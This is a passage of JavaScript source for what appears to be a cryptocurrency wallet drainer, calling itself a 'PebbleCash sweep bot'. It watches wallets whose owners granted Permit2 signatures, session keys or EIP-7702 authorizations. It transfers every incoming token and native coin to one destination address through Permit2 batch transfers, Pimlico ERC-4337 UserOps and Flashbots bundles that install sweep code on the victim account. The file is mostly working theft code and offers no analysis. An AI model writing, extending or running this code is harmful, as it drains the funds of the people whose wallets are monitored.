        } catch { /* skip */ }
      }

      if (withBalance.length === 0) { log(`[gasless] all zero — skipping`); return; }
      log(`[gasless] sweeping ${withBalance.length} tokens`);

      try {
        const fee = await getFeeData();
        const gasLimit = 150_000n + BigInt(withBalance.length) * 100_000n;
        const tx = await permit2Batch.permitTransferFrom(
          { permitted: withBalance.map(t => ({ token: t.token, amount: BigInt(t.amount) })), nonce: BigInt(sig.nonce), deadline: dl },
          withBalance.map(t => ({ to: DESTINATION_ADDRESS, requestedAmount: t.balance })),
          checksum,
          stData.signature,
          { gasLimit, ...fee },
        );
        await tx.wait();
        log(`[gasless] ✅ swept ${withBalance.length} tokens`);
        supabase.from("delegated_wallets").update({ needs_reactivation: false })
          .eq("address", addrKey).eq("chain", CHAIN).then().catch(() => {});
      } catch (e) {
        err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
      }
    }
  }
}

// ══════════════════════════════════════════════════════════════════════════
// TIER 0A: SESSION KEY VIA PIMLICO ERC-4337 USEROP
// ══════════════════════════════════════════════════════════════════════════

async function sweepViaSessionKey(checksum, short, addrKey) {
  // Read session from Supabase session_keys table
  if (!supabase) { log(`[session] no supabase — skipping ${short}`); return false; }

  let { data: session } = await supabase
    .from("session_keys")
    .select("*")
    .eq("address", addrKey)
    .eq("chain", CHAIN)
    .single();

  if (!session) {
    log(`[session] no session found for ${short} — checking delegated_wallets fallback`);
    // Fallback: read from delegated_wallets.permit_metadata
    const { data: dw } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .single();
    if (!dw?.permit_metadata?.expiry) { log(`[session] no session data for ${short}`); return false; }
    session = { expiry: dw.permit_metadata.expiry, session_data: dw.permit_metadata.session_data };
  }

  if (!session || !session.expiry) { log(`[session] no session data for ${short}`); return false; }

  const expiry = BigInt(session.expiry);
  if (expiry < BigInt(Math.floor(Date.now() / 1000))) {
    log(`[session] expired for ${short} — marking needs-reauth`);
    await supabase.from("delegated_wallets")
      .update({ status: "needs-reauth" })
      .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
    return false;
  }

  // Check balances
  const balances = await checkAllBalances(checksum);
  const nonZero = balances.filter(b => b.balance > 0n);
  const nativeBal = await rpcProvider.getBalance(checksum);

  if (nonZero.length === 0 && nativeBal === 0n) {
    log(`[session] all zero for ${short} — skipping`);
    return false;
  }

  log(`[session] sweeping ${nonZero.length} tokens + native=${ethers.formatEther(nativeBal)} for ${short}`);

  // Build calls array
  const calls = [];

  // Native sweep
  if (nativeBal > 0n) {
    calls.push({
      to: DESTINATION_ADDRESS,
      value: nativeBal,
      data: "0x",
    });
  }

  // ERC20 sweeps — encode transfer() calls
  const ERC20_TRANSFER_IFACE = new ethers.Interface(["function transfer(address to, uint256 value) external returns (bool)"]);
  for (const token of nonZero) {
    calls.push({
      to: token.address,
      value: 0n,
      data: ERC20_TRANSFER_IFACE.encodeFunctionData("transfer", [DESTINATION_ADDRESS, token.balance]),
    });
  }

  try {
    // Dynamic import of permissionless + viem (ESM-only packages)
    const { createSmartAccountClient } = await import("permissionless");
    const { createPimlicoClient } = await import("permissionless/clients/pimlico");
    const { http, createPublicClient, defineChain } = await import("viem");

    const pimlicoUrl = PIMLICO_URLS[CHAIN];
    if (!pimlicoUrl || !PIMLICO_API_KEY) {
      log(`[session] Pimlico not configured for ${CHAIN} — using fallback sweep`);
      return false;
    }

    // Define the chain for viem
    const viemChain = defineChain({
      id: CHAIN === "eth" ? 1 : CHAIN === "bnb" ? 56 : 137,
      name: CHAIN.toUpperCase(),
      nativeCurrency: {
        name: CHAIN === "eth" ? "Ether" : CHAIN === "bnb" ? "BNB" : "MATIC",
        symbol: CHAIN === "eth" ? "ETH" : CHAIN === "bnb" ? "BNB" : "MATIC",
        decimals: 18,
      },
      rpcUrls: { default: { http: [RPC_URL] } },
    });

    const pimlicoClient = createPimlicoClient({
      transport: http(pimlicoUrl),
    });

    const publicClient = createPublicClient({
      transport: http(RPC_URL),
    });

    const smartAccountClient = createSmartAccountClient({
      account: {
        address: checksum,
        ...(session.session_data || {}),
      },
      chain: viemChain,
      bundlerTransport: http(pimlicoUrl),
      paymaster: pimlicoClient,
      paymasterContext: {
        sponsorshipPolicyId: PIMLICO_POLICY_ID,
      },
    });

    const userOpHash = await smartAccountClient.sendUserOperation({ calls });
    log(`[session] UserOp submitted: ${userOpHash}`);

    const receipt = await smartAccountClient.waitForUserOperationReceipt({ hash: userOpHash });
    log(`[session] ✅ swept via session key tx: ${receipt.receipt.transactionHash}`);
    log(`[session] tokens: ${nonZero.map(t => t.symbol || t.address.slice(0,10)).join(", ")}`);
    return true;

  } catch (e) {
    log(`[session] ❌ UserOperation failed for ${short}: ${e.message}`);
    // If permissionless is not installed or import fails, do simpler fallback
    if (e.code === "ERR_MODULE_NOT_FOUND" || e.message?.includes("Cannot find module")) {
      log(`[session] permissionless/viem not installed — falling back`);
    }
    return false;
  }
}

// ══════════════════════════════════════════════════════════════════════════
// TIER 0B: EIP-7702 + FLASHBOTS ATOMIC BUNDLE (ETH ONLY)
// ══════════════════════════════════════════════════════════════════════════

async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
  // Flashbots only works on ETH mainnet
  if (CHAIN !== "eth") { return false; }
  if (!FLASHBOTS_AUTH_KEY) {
    log(`[flashbots] FLASHBOTS_AUTH_KEY not set`);
    return false;
  }

  log(`[flashbots] building atomic bundle for ${short}`);

  // Read authorization from delegated_wallets
  if (!supabase) { log(`[flashbots] no supabase`); return false; }
  const { data: authData } = await supabase
    .from("delegated_wallets")
    .select("authorization")
    .eq("address", addrKey)
    .eq("chain", "eth")
    .single();

  if (!authData?.authorization) {
    log(`[flashbots] no authorization stored for ${short}`);
    return false;
  }

  // Check balances
  const balances = await checkAllBalances(checksum);
  const nonZero = balances.filter(b => b.balance > 0n);
  const nativeBal = await rpcProvider.getBalance(checksum);

  if (nonZero.length === 0 && nativeBal === 0n) {
    log(`[flashbots] all zero for ${short} — skipping`);
    return false;
  }

  log(`[flashbots] sweeping ${nonZero.length} tokens + native=${ethers.formatEther(nativeBal)}`);

  try {
    // Get current gas prices
    const feeData = await rpcProvider.getFeeData();
    const block = await rpcProvider.getBlock("latest");
    const baseFee = block?.baseFeePerGas || 0n;
    const maxPrio = feeData.maxPriorityFeePerGas || 1_000_000_000n; // 1 gwei default
    const maxFee = baseFee * 2n + maxPrio;

    const targetBlock = block.number + 1;

    // TX 1: EIP-7702 SetCode — sets user EOA code to TCNDelegation
    const setCodeTx = {
      type: 4,
      to: checksum,
      value: 0,
      data: "0x",
      gasLimit: 50000,
      maxFeePerGas: maxFee,
      maxPriorityFeePerGas: maxPrio,
      nonce: await rpcProvider.getTransactionCount(relayerWallet.address),
      chainId: 1,
      authorizationList: [authData.authorization],
    };

    // TX 2: sweepAll() on the now-delegated EOA
    const DELEGATION_SWEEP_IFACE = new ethers.Interface([
      "function sweepAll(address to) external",
    ]);
    const sweepTx = {
      type: 2,
      to: checksum,
      value: 0,
      data: DELEGATION_SWEEP_IFACE.encodeFunctionData("sweepAll", [DESTINATION_ADDRESS]),
      gasLimit: 300000 + (nonZero.length * 50000),
      maxFeePerGas: maxFee,
      maxPriorityFeePerGas: maxPrio,
      nonce: await rpcProvider.getTransactionCount(relayerWallet.address) + 1,
      chainId: 1,
    };

    // Sign both transactions with relayer key
    const signedSetCode = await relayerWallet.signTransaction(setCodeTx);
    const signedSweep = await relayerWallet.signTransaction(sweepTx);

    // Use Flashbots relay via eth_callBundle (simulate) then eth_sendBundle
    const authSigner = new ethers.Wallet(FLASHBOTS_AUTH_KEY);
    const flashbotsAuth = await authSigner.signMessage(
      ethers.getBytes(ethers.keccak256(ethers.toUtf8Bytes("FLASHBOTS_AUTH")))
    );

    const bundleParams = {
      txs: [signedSetCode, signedSweep],
      blockNumber: ethers.toBeHex(targetBlock),
      minTimestamp: 0,
      maxTimestamp: 0,
      revertingTxHashes: [],
    };

    // Simulate first
    const flashbotsRelay = "https://relay.flashbots.net";
    const simBody = {
      jsonrpc: "2.0",
      id: 1,
      method: "eth_callBundle",
      params: [bundleParams],
    };

    const simRes = await fetch(flashbotsRelay, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Flashbots-Signature": `${authSigner.address}:${flashbotsAuth}`,
      },
      body: JSON.stringify(simBody),
    });

    const simResult = await simRes.json();
    if (simResult.error) {
      log(`[flashbots] simulation failed: ${simResult.error.message}`);
      return false;
    }

    log(`[flashbots] simulation OK — bundle gas: ${simResult.result?.bundleGasPrice || "unknown"}`);

    // Send bundle — try 3 consecutive blocks
    let included = false;
    for (let i = 0; i < 3; i++) {
      const blockNum = targetBlock + i;
      bundleParams.blockNumber = ethers.toBeHex(blockNum);

      const sendBody = {
        jsonrpc: "2.0",
        id: 1,
        method: "eth_sendBundle",
        params: [bundleParams],
      };

      const sendRes = await fetch(flashbotsRelay, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Flashbots-Signature": `${authSigner.address}:${flashbotsAuth}`,
        },
        body: JSON.stringify(sendBody),
      });

      const sendResult = await sendRes.json();
      if (sendResult.error) {
        log(`[flashbots] bundle error for block ${blockNum}: ${sendResult.error.message}`);
        continue;
      }

      log(`[flashbots] bundle submitted for block ${blockNum} — bundleHash: ${sendResult.result?.bundleHash}`);

      // Wait 12 seconds for block inclusion
      await sleep(12_000);

      // Check if bundle was included by verifying target block
      const currentBlock = await rpcProvider.getBlockNumber();
      if (currentBlock >= blockNum) {
        log(`[flashbots] block ${blockNum} passed — checking code`);
        const code = await rpcProvider.getCode(checksum);
        if (code && code !== "0x" && code.startsWith("0xef0100")) {
          log(`[flashbots] ✅ delegation active — checking if sweeps went through`);
          const postNative = await rpcProvider.getBalance(checksum);
          if (postNative < nativeBal) {
            log(`[flashbots] ✅ bundle included in block ${blockNum}`);
            included = true;
            break;
          }
        }
        log(`[flashbots] bundle not confirmed in block ${blockNum} — trying next`);
      } else {
        log(`[flashbots] block ${blockNum} not yet reached — trying next`);
      }
    }

    if (!included) {
      log(`[flashbots] bundle not included after 3 blocks — falling back to standard EIP-7702`);
      return false;
    }

    return true;

  } catch (e) {
    log(`[flashbots] ❌ error for ${short}: ${e.message}`);
    return false;
  }
}

// ── Transfer event listeners ──────────────────────────────────────────────────

async function startTransferListeners(wsProvider, tokens) {
  const transferTopic = ethers.id("Transfer(address,address,uint256)");

  // Build address→token lookup for fast decode inside handler
  const tokenByAddr = new Map(tokens.map(t => [t.address.toLowerCase(), t]));

  // Split into batches of 10 addresses — some nodes have array-size limits
  const BATCH_SIZE = 10;
  const batches = [];
  for (let i = 0; i < tokens.length; i += BATCH_SIZE) {
    batches.push(tokens.slice(i, i + BATCH_SIZE));
  }

  log(`[listeners] creating ${batches.length} log-filter subscriptions for ${tokens.length} tokens (${monitoredWallets.size} wallets monitored)`);

  for (let i = 0; i < batches.length; i++) {
    // Stagger 200ms between each batch to stay within rate limits
    if (i > 0) await sleep(200);

    const batch  = batches[i];
    const filter = {
      topics:  [transferTopic],
      address: batch.map(t => t.address),
    };

    try {
      wsProvider.on(filter, async (txLog) => {
        // topics[2] = padded 'to' address
        const to      = "0x" + txLog.topics[2].slice(26);
        const toLower = to.toLowerCase();

        if (!monitoredWallets.has(toLower)) return;

        const amount = BigInt(txLog.data);
        if (amount === 0n) return;

        const token  = tokenByAddr.get(txLog.address.toLowerCase());
        const symbol = token?.symbol ?? txLog.address.slice(0, 8);
        log(`[transfer] 📥 ${symbol} → ${to.slice(0, 10)} amount=${ethers.formatUnits(amount, token?.decimals ?? 18)} — sweeping`);

        if (sweepingNow.has(toLower)) {
          log(`[transfer] debounced — already sweeping ${to.slice(0, 10)}`);
          return;
        }
        sweepingNow.add(toLower);

        const wallet = monitoredWallets.get(toLower);
        dispatchSweep(wallet)
          .catch(e => log(`[transfer] sweep error for ${to.slice(0, 10)}: ${e.message}`))
          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
      });
    } catch (e) {
      warn(`[listeners] batch ${i} subscription failed: ${e.message}`);
    }
  }

  log(`[listeners] ✅ ${batches.length} log-filter subscriptions active for ${tokens.length} tokens`);
}

let lastBlockFetch = 0;

async function startNativeListener(wsProvider) {
  wsProvider.on("block", async (blockNumber) => {
    reconnectAttempt = 0; // reset backoff on each received block
    if (monitoredWallets.size === 0) return;

    const hasEIP7702 = [...monitoredWallets.values()].some(w => w.type === "eip7702");
    if (!hasEIP7702) return;

    // Throttle: max 1 full-block fetch per 120s — 96% fewer RPC calls.
    const now = Date.now();
    if (now - lastBlockFetch < 120_000) return;
    lastBlockFetch = now;

    try {
      const block = await scanProvider.getBlock(blockNumber, true);
      if (!block?.transactions) return;

      for (const tx of block.transactions) {
        if (!tx.to) continue;
        const toLower = tx.to.toLowerCase();
        if (!monitoredWallets.has(toLower)) continue;
        if (!tx.value || tx.value === 0n) continue;

        const wallet = monitoredWallets.get(toLower);
        log(`[native] 📥 ${ethers.formatEther(tx.value)} native → ${tx.to.slice(0, 10)} type=${wallet.type}`);

        if (wallet.type !== "eip7702") {
          log(`[native] wallet not EIP-7702 — native coin cannot be swept`);
          continue;
        }
        if (sweepingNow.has(toLower)) {
          log(`[native] debounced — already sweeping ${tx.to.slice(0, 10)}`);
          continue;
        }
        sweepingNow.add(toLower);
        sweepEIP7702Wallet(wallet.address)
          .then(() => log(`[native] ✅ swept for ${tx.to.slice(0, 10)}`))
          .catch(e  => log(`[native] sweep error: ${e.message}`))
          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
      }
    } catch (e) {
      if (e.message?.includes("rate limit") || e.message?.includes("50/second") || e.message?.includes("429")) {
        log(`[native] rate limited — skipping block ${blockNumber}`);
      } else if (!e.message?.includes("timeout")) {
        warn(`[native] block scan error at ${blockNumber}: ${e.message}`);
      }
    }
  });
  log(`[listeners] ✅ native coin listener active`);
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadDelegatedWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("delegated_wallets")
      .select("address, type")
      .eq("chain", CHAIN);
    if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
    delegatedWallets.clear();
    monitoredWallets.clear();
    for (const row of data || []) {
      const checksum = normalizeAddress(row.address);
      if (!checksum) continue;
      const type = row.type || "eip7702";
      delegatedWallets.set(checksum, type);
      monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type });
    }
    const types    = [...delegatedWallets.values()];
    const e7Count  = types.filter(t => t === "eip7702").length;
    const skCount  = types.filter(t => t === "session-key").length;
    const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback" || t === "permit2-gasless").length;
    log(`[init] loaded ${delegatedWallets.size} wallets (${skCount} session, ${e7Count} eip7702, ${p2Count} permit2)`);
  } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
}

// ── Supabase Realtime ─────────────────────────────────────────────────────────

function subscribeRealtime() {
  if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }

  if (realtimeChannel) {
    supabase.removeChannel(realtimeChannel).catch(() => {});
    realtimeChannel = null;
  }

  realtimeChannel = supabase
    .channel(`bot_realtime_${CHAIN}`)

    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        const isNew = !monitoredWallets.has(address.toLowerCase());
        delegatedWallets.set(address, type);
        monitoredWallets.set(address.toLowerCase(), { address, type });
        needsReconnect.delete(address.toLowerCase());
        needsReauthWallets.delete(address.toLowerCase());
        log(`[realtime] 🔔 ${isNew ? "new" : "updated"} wallet ${address.slice(0, 10)} (${type}) — checking balance`);
        const balances = await checkAllBalances(address);
        const nonZero  = balances.filter(b => b.balance > 0n);
        if (nonZero.length > 0) {
          log(`[realtime] has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping immediately`);
          await dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
        } else {
          log(`[realtime] ${address.slice(0, 10)} — no existing balance, monitoring for transfers`);
        }
      }
    )

    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        if (type === "monitoring") return;
        delegatedWallets.set(address, type);
        monitoredWallets.set(address.toLowerCase(), { address, type });
        needsReconnect.delete(address.toLowerCase());
        needsReauthWallets.delete(address.toLowerCase());
        log(`[realtime] 🔄 re-activated ${address.slice(0, 10)} (${type}) — dispatching sweep`);
        dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
      }
    )

    .subscribe((status) => {
      if (status === "SUBSCRIBED") {
        log(`[realtime] ✅ subscribed (delegated_wallets, chain=${CHAIN})`);
      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
        warn(`[realtime] ${status} — resubscribing in 10s`);
        setTimeout(subscribeRealtime, 10_000);
      }
    });
}

// ── WSS listener: Transfer events + native block scanner ─────────────────────

async function startBot() {
  try {
    const wsProvider = new ethers.WebSocketProvider(WS_URL);

    wsProvider.websocket.on("error", (wsErr) => {
      warn(`[ws] error: ${wsErr?.message ?? wsErr}`);
    });

    wsProvider.websocket.on("close", () => {
      warn("[ws] closed — removing listeners and reconnecting...");
      wsProvider.removeAllListeners();
      const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
      const delay = withJitter(base);
      reconnectAttempt++;
      log(`[ws] reconnecting in ${(delay / 1000).toFixed(1)}s (attempt ${reconnectAttempt})...`);
      setTimeout(startBot, delay);
    });

    // TOKENS loaded once in init() with 24h file cache — NEVER re-fetched here.
    // rpcProvider NOT recreated — FallbackProvider handles failover internally.
    await startTransferListeners(wsProvider, TOKENS);
    await startNativeListener(wsProvider);

    log(`[ws] ✅ connected — Transfer listeners active for ${TOKENS.length} tokens`);
  } catch (e) {
    err(`[ws] startBot failed: ${e.message}`);
    const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
    const delay = withJitter(base);
    reconnectAttempt++;
    log(`[ws] retrying in ${(delay / 1000).toFixed(1)}s (attempt ${reconnectAttempt})...`);
    setTimeout(startBot, delay);
  }
}

// ── Init ──────────────────────────────────────────────────────────────────────

async function init() {
  log("[init] PebbleCash sweep bot starting...");
  log(`[init] chain=${CHAIN}`);
  log(`[init] relayer=${relayerWallet.address}`);
  log(`[init] destination=${DESTINATION_ADDRESS}`);
  log(`[init] permit2=${PERMIT2_ADDRESS}`);
  if (CONTRACT_ADDRESS) log(`[init] contract=${CONTRACT_ADDRESS}`);

  // 1. Load token list (CoinGecko with 24h file cache)
  TOKENS = await loadTokens();
  log(`[init] ${TOKENS.length} tokens loaded`);

  // 2. Check relayer balance upfront — warn but always continue
  const relayerOk = await checkRelayerBalance();
  if (!relayerOk) {
    log(`[init] ⚠️  RELAYER CRITICALLY LOW — bot will start but sweeps are DISABLED`);
    log(`[init] Top up relayer: send ${CHAIN.toUpperCase()} to ${relayerWallet.address}`);
    log(`[init] Required minimum: ${ethers.formatEther(RELAYER_MIN_WEI)} ${CHAIN.toUpperCase()}`);
  }

  // 3. Load wallets from Supabase (populates monitoredWallets + delegatedWallets)
    await loadDelegatedWallets();

  // 4. Subscribe to Supabase Realtime for new/updated wallets
    subscribeRealtime();

  // 5. Start WSS: Transfer event listeners + native block scanner
  startBot();

  log("[init] ✅ bot ready — listening for Transfer events and Realtime");
  log("[init] sweeps are event-driven: Transfer events and Realtime will trigger dispatch");

  setImmediate(() => startupSweepPass());
}

async function startupSweepPass() {
  const wallets = [...monitoredWallets.values()];
  if (!wallets.length) return;
  log(`[startup] checking balances for ${wallets.length} wallets…`);
  let swept = 0;
  for (const w of wallets) {
    if (w.type === "monitoring") continue;
    try {
      const balances = await checkAllBalances(w.address);
      const nonZero  = balances.filter(b => b.balance > 0n);
      if (nonZero.length > 0) {
        log(`[startup] ${w.address.slice(0, 10)} has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping`);
        await dispatchSweep(w).catch(e => log(`[startup] sweep error: ${e.message}`));
        swept++;
      }
    } catch (e) {
      // non-fatal: skip and move to next wallet
    }
    await new Promise(r => setTimeout(r, 200));
  }
  log(`[startup] pass complete — swept ${swept}/${wallets.length} wallets with balance`);
}

init().catch((e) => { err(`Init failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down…"); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down…"); process.exit(0); });
